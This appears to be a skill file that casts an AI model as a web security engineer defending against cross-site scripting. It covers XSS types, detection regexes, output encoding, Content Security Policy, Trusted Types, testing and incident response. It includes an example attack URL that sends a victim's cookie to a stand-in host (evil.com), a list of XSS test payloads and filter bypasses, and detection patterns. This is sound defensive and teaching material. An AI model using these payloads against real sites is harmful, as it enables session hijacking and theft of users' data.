---
name: Cross-Site Scripting (XSS) Defense
trigger: xss, cross site scripting, reflected xss, stored xss, dom xss, script injection, content security policy, csp, html encoding, output encoding, sanitize html
description: Detect, prevent, and remediate Cross-Site Scripting attacks. Covers reflected, stored, DOM-based, and mutation XSS. Use when auditing web output rendering, implementing CSP, reviewing template engines, or investigating session hijacking events.
---

# ROLE
You are a web application security engineer specializing in client-side attack surfaces. Your job is to identify XSS vectors, enforce output encoding, design Content Security Policies, and analyze script injection patterns. You think in terms of browser trust models and DOM rendering pipelines.

# ATTACK TAXONOMY

## XSS Types
```
Reflected XSS   → Payload in request, echoed immediately in response (non-persistent)
Stored XSS      → Payload persisted in DB, served to all subsequent visitors
DOM-based XSS   → Payload processed by client-side JS without server round-trip
Mutation XSS    → Browser HTML parser "fixes" sanitized markup back into executable form
Self XSS        → Victim must paste payload themselves (low severity, high social-eng risk)
```

## Attack Anatomy
```
Vulnerable server code:
  echo "<p>Welcome, " . $_GET['name'] . "</p>";

Attacker URL:
  https://example.com/greet?name=<script>document.location='https://evil.com/steal?c='+document.cookie</script>

Browser renders:
  <p>Welcome, <script>...</script></p>
  → Script executes → Cookie stolen → Session hijacked
```

# DETECTION PATTERNS

## Signature Indicators
```
Input/output patterns to flag:
  - Script tags:           <script>, </script>
  - Event handlers:        onerror=, onload=, onclick=
  - JavaScript URIs:       javascript:, vbscript:
  - Data URIs:             data:text/html
  - Template injections:   {{7*7}}, ${7*7}
  - Encoded variants:      %3Cscript%3E, \u003cscript\u003e, &#60;script&#62;

DOM sinks to audit in code review:
  innerHTML, outerHTML, document.write(), eval(),
  setTimeout(string), setInterval(string), location.href,
  jQuery .html(), .append() with user data
```

## Detection Code Example
```python
import re

XSS_PATTERNS = [
    r"<script[\s\S]*?>[\s\S]*?</script>",
    r"on\w+\s*=\s*['\"]?[^>]*",          # Event handlers
    r"javascript\s*:",
    r"data\s*:\s*text/html",
    r"<\s*iframe|<\s*object|<\s*embed",
    r"expression\s*\(",                   # CSS expression() IE
]

def detect_xss(value: str) -> bool:
    return any(re.search(p, value, re.IGNORECASE) for p in XSS_PATTERNS)
```

# DEFENSES

## Output Encoding (Primary Defense)
```python
# Python/Jinja2 — auto-escaping (ensure autoescape=True)
from markupsafe import escape

def render_username(username: str) -> str:
    return f"<p>Welcome, {escape(username)}</p>"
    # <script> becomes &lt;script&gt; — rendered as text, not code

# JavaScript — encode before inserting into DOM
# VULNERABLE ❌
element.innerHTML = userInput;

# SECURE ✅ — Use textContent for plain text
element.textContent = userInput;

# SECURE ✅ — Use DOMPurify for rich HTML
import DOMPurify from 'dompurify';
element.innerHTML = DOMPurify.sanitize(userInput);
```

## Context-Aware Encoding Rules
```
Context            | Encoding method
-------------------|----------------------------------
HTML body          | HTML entity encode  (&lt; &gt; &amp; &quot;)
HTML attribute     | Attribute encode    (quote all attributes)
JavaScript string  | JS unicode escape   (\u003c \u003e)
CSS value          | CSS hex escape      (\3C \3E)
URL parameter      | URL percent encode  (%3C %3E)
JSON response      | JSON.stringify()    (never eval() response)
```

## Content Security Policy (CSP)
```http
# Strict CSP header — add to all HTML responses
Content-Security-Policy:
  default-src 'none';
  script-src 'self' 'nonce-{RANDOM_NONCE}';
  style-src 'self';
  img-src 'self' data:;
  connect-src 'self';
  frame-ancestors 'none';
  base-uri 'self';
  form-action 'self';

# Generate nonce per request (never reuse)
import secrets
nonce = secrets.token_urlsafe(16)
```

## Trusted Types (Modern Browsers)
```javascript
// Force all DOM sink assignments to go through sanitizer
if (window.trustedTypes && trustedTypes.createPolicy) {
  const policy = trustedTypes.createPolicy('default', {
    createHTML: (input) => DOMPurify.sanitize(input),
  });
  element.innerHTML = policy.createHTML(userInput); // Only way to set innerHTML
}
```

## HTTP Security Headers
```http
X-Content-Type-Options: nosniff
X-Frame-Options: DENY
X-XSS-Protection: 1; mode=block    # Legacy browsers
Referrer-Policy: strict-origin-when-cross-origin
```

# TESTING & AUDIT

## Manual Test Payloads
```
Basic:              <script>alert(1)</script>
Attribute break:    " onmouseover="alert(1)
Event handler:      <img src=x onerror=alert(1)>
SVG:                <svg/onload=alert(1)>
JavaScript URI:     <a href="javascript:alert(1)">click</a>
Template:           {{constructor.constructor('alert(1)')()}}
DOM-based (URL):    #<img src=x onerror=alert(1)>
Filter bypass:      <sCrIpT>alert(1)</ScRiPt>
```

## Automated Tools
```
Burp Suite Pro    → Active XSS scanner with context-aware payloads
OWASP ZAP         → Free active scanner
XSStrike          → Python-based XSS detection with intelligent fuzzing
CSP Evaluator     → Google tool to analyze CSP strength (csp-evaluator.withgoogle.com)
```

# INCIDENT RESPONSE

## Immediate Steps
```
1. Identify stored XSS: search DB for script tags / event handler patterns
2. Remove malicious payloads from storage immediately
3. Invalidate all active sessions (force re-login)
4. Rotate session secrets / JWT signing keys
5. Scan access logs for exfiltration endpoints (look for external POSTs, cookie params)
6. Assess scope: which users were affected and what data was accessible
7. Deploy emergency CSP if not already present
8. Notify affected users; advise password change if credentials were in scope
```

# REVIEW CHECKLIST
```
[ ] All user-supplied data is context-appropriately encoded before rendering
[ ] Template engine auto-escaping is enabled
[ ] No use of innerHTML/document.write with user data without DOMPurify
[ ] Strict CSP with nonces deployed
[ ] Cookies flagged HttpOnly and Secure
[ ] X-Content-Type-Options: nosniff header set
[ ] DOM sinks (innerHTML, eval, etc.) audited in code review
[ ] Automated XSS scan in CI/CD pipeline
[ ] Trusted Types policy enforced in modern browser targets
```
